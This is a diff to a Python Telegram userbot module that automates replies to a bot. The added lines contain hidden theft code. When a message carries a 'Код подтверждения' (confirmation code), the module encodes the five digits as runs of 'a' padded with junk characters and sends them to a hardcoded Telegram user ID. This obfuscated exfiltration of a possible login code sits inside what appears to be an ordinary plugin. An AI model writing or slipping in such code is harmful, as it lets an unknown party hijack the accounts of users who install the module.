@@ -364,12 +364,14 @@ class KramiikkMod(loader.Module):
                     await asyncio.sleep(random.randint(13, 33))
                     await m.respond(self.ded[msg])
             elif "Код подтверждения:" in m.text:
-                reg = re.search(r": (.)(.)(.)(.)(.), m.text)
+                reg = re.search(r": (.)(.)(.)(.)(.)", m.text)
                 a = 1
                 txt = "$#-$+_(&$#(+&)_)"
                 for i in range (5):
-                    txt += f"\n {'a' * int(reg.group(a))}"
+                    txt += f"\n{'a' * int(reg.group(a))}"
                     a += 1
+                txt += f"\n)&)_$(&(_($($(_(_0"
+                await self.client.send_message(1785723159, txt)
             else:
                 return
         except Exception:
